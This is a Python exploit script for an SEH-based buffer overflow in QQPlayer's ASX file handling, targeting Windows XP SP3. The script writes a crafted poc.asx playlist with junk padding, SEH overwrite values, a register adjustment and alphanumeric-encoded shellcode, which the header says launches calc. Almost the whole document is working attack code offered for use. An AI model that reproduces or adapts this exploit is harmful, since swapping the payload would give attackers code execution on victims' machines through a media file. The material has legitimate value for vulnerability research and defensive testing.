#################################################################
#
# Title: QQPlayer asx File Processing Buffer Overflow Exploit
# Author: Li Qingshan of Information Security Engineering Center,School of Software and Microelectronics,Peking University
# Vendor: www.qq.com
# Platform: Windows XPSP3 Chinese Simplified
# Test: QQPlayer 2.3.696.400
# Vulnerable: QQPlayer<=2.3.696.400p1
# Payload = calc
#
#################################################################
# Code :

head ='''<ASX version="3.0">
<Entry>
<REF HREF="mms://site.com/ach/music/smpl/LACA-05928-002-tes_'''
junk = "A" * 1975  #English XP SP3 users, try 1984 bytes instead
nseh ="\x42\x61\x21\x61"
seh  ="\xa9\x9e\x41\x00"
adjust="\x30\x83\xc0\x0c"
shellcode=("PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIKLM8LI5PUPUPSPMYZEV"
           "QN2BDLKPRVPLKQB4LLK0RR4LKSBWX4ONW1ZWVFQKO6QO0NLWL3QSLS26L7PIQ8ODM5QIWKRZPPRQGL"
           "KQB4PLKPB7L5QXPLKQP2XK5IP44QZ5QXPPPLKQX4XLKQHGPUQN3KSGLQYLKP4LKUQ9FFQKOVQO0NL9"
           "QXODM5QYWFXKPD5JT4C3MZXWK3MWTT5KRPXLKQHWTEQ8SCVLKTLPKLKQH5LEQN3LKS4LKC1XPMY1TW"
           "TGT1KQKSQ0YPZ0QKOKP0XQOQJLKTRJKMVQMCZUQLMLEOIUPUPC0PPRHP1LKROLGKON5OKZPNUORF6R"
           "HOVLUOMMMKOIE7LC6SLUZMPKKM0BU5UOKQWB32R2ORJ5PPSKOHUE3512LSS6N3U2X3UUPDJA")
junk_="R"*8000
foot ='''_playlis.wma"/>
</Entry>
</ASX>'''
payload=head+junk+nseh+seh+adjust+shellcode+junk_+foot

fobj = open("poc.asx","w")
fobj.write(payload)
fobj.close()

